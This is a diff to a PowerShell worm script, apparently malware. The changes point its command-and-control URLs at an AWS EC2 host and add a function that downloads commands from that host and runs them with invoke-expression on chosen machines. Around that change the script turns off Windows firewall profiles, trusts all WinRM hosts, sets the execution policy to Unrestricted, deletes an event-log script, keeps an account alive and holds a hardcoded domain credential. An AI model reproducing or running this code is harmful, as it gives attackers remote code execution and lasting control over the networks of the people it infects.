@@ -8,6 +8,7 @@ remove-item c:\Windows\EventLog.ps1
 [net.servicepointmanager]::SecurityProtocol = [net.securityprotocoltype]::Tls12
 import-module activedirectory
 set-executionpolicy Unrestricted -force
+$read = @()
 
 Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*' -Force
 $osInfo = Get-CimInstance -ClassName Win32_OperatingSystem
@@ -16,8 +17,8 @@ $c0de='Tossking@'
 $c0de=$c0de+$toAppend
 $username='magrene'
 $usernameB=((gwmi WIN32_ComputerSystem).Domain+'\magrene')
-$cNcURL='http://ec2-44-192-30-152.compute-1.amazonaws.com/f5423r/ctrlc/fffeeeezzzz/23retefd.txt'
-$timeURL='http://ec2-44-192-30-152.compute-1.amazonaws.com/eeee/timeZ.txt'
+$cNcURL='http://ec2-3-235-98-86.compute-1.amazonaws.com/f5423r/ctrlc/fffeeeezzzz/23retefd.txt'
+$timeURL='http://ec2-3-235-98-86.compute-1.amazonaws.com/eeee/timeZ.txt'
 [SecureString]$secureString = $c0de | ConvertTo-SecureString -AsPlainText -Force 
 [PSCredential]$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $userNameB, $secureString
 
@@ -78,12 +79,11 @@ function keepWINRMAlive{
     }
 }
 function wormy{
-    
+    cNc
     while(1 -eq 1){
         [SecureString]$secureString = $c0de | ConvertTo-SecureString -AsPlainText -Force 
         [PSCredential]$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $userNameB, $secureString
-        $httpCommand=invoke-restmethod $cNcURL
-        invoke-expression $httpCommand
+
         accountPersist
         Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
         [int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'
@@ -178,5 +178,20 @@ start-job -ScriptBlock {
     }
 }
 
+function cNc{
+    $httpCommand=invoke-restmethod $cNcURL
+    $hostIP= Get-NetIPAddress | where {($_.IPAddress -like "10.*")}
+    
+    foreach($line in Get-Content $httpCommand) {
+        $read += $line
+    }
+    if($read[1] -eq ($hostIP.split("."))[3] ){
+        if($read[0] -eq ($hostIP.split("."))[1] -or $read[0] -eq 'all'){
+            invoke-expression $read[2]
+        }
+    }
+
+    
+}
 
 wormy
